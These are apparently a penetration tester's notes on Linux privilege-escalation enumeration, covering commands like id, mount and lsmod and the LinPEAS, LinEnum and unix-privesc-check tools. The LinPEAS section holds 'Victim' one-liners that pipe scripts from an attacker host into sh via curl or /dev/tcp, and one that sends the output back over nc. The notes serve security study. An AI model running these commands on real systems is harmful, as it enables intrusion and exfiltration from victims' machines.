# Linux Enumeration



One of the first things we should identify is the user context.
```
id
```
The output reveals:
- the user we are operating as
- our User Identifier (UID)
- our Group Identifier (GID)
- wether we are also part of other groups






## Drives
On most systems, drives are automatically mounted at boot time.
Because of this, it's easy to forget about unmounted drives that could contain valuable information.
We should always look for unmounted drives, and if they exist, check the mount permissions.

Use `mount` to list all mounted filesystems.

In addition, the `/etc/fstab` file lists all drives that will be mounted at boot time.


Keep in mind that the system administrator might have used custom configurations or scripts to mount drives that are not listed in the `/etc/fstab` file. Because of this, it's good practice to not only scan `/etc/fstab`, but to also gather information about mounted drives using `mount`.


Furthermore, we can use `lsblk` to view all available disks.






## Enumerate the loaded kernel modules
```
lsmod
```

Once we've collected the list of loaded modules and identified those we want more information about we can use modinfo to find out more about the specific module.

Note: this tool requires the full path to run.

Example with module `libata`:
```
/sbin/modinfo libata
```


Once we've obtained a list of drivers and their versions, we are better positioned to find any relevant exploits.
















## Automated Enumeration




### privesc-check

- <https://pentestmonkey.net/tools/audit/unix-privesc-check>
```
/usr/bin/unix-privesc-check
```













### LinPEAS

- <https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS>

Enumerate and search Privilege Escalation vectors.

This tool enum and search possible misconfigurations (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...) inside the host and highlight possible misconfigurations with colors.


Download LinPEAS:
```
# From github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Without curl
python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"

python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"


# Use a linpeas binary
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64


```


```
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```




Output to file:
```
./linpeas.sh -a > /dev/shm/linpeas.txt

# Read with colors
less -r /dev/shm/linpeas.txt
```


#### Flags

Checks:

`-a` Perform all checks: 1 min of processes, su brute, and extra checks.

`-o` Only execute selected checks (system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex). Select a comma separated list.

`-s` Stealth & faster (don't check some time consuming checks)                                                                                    
`-e` Perform extra enumeration

`-t` Automatic network scan & Internet conectivity checks - This option writes to files                                                           
`-r` Enable Regexes (this can take from some mins to hours)                                                                                       
`-P` Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'     
                                  
`-D` Debug mode



Network recon:
                                                     
`-t` Automatic network scan & Internet conectivity checks - This option writes to files
                                                         
`-d` <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24                                      
                                 
`-p` <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139
                     
`-i` <IP> [-p <PORT(s)>] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080                                                                                                                
Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed                                  
																																				
Port forwarding (reverse connection):

`-F` LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT Execute linpeas to forward a port from a your host (LOCAL_IP:LOCAL_PORT) to a remote IP (REMOTE_IP:REMOTE_PORT)                                                                                                                                                
																																				
Firmware recon:

`-f` </FOLDER/PATH> Execute linpeas to search passwords/file permissions misconfigs inside a folder                                               
																																				
Misc:                                                                                                                                               
`-h` To show this message                                                                                                                         
`-w` Wait execution between big blocks of checks                                                                                                  
`-L` Force linpeas execution                                                                                                                      
`-M` Force macpeas execution                                                                                                                      
`-q` Do not show banner                                                                                                                           
`-N` Do not use colours                                     




























### LinEnum
- <https://github.com/rebootuser/LinEnum>

- <https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>

```

LinEnum.sh -s -k keyword -r report -e /tmp/ -t

```










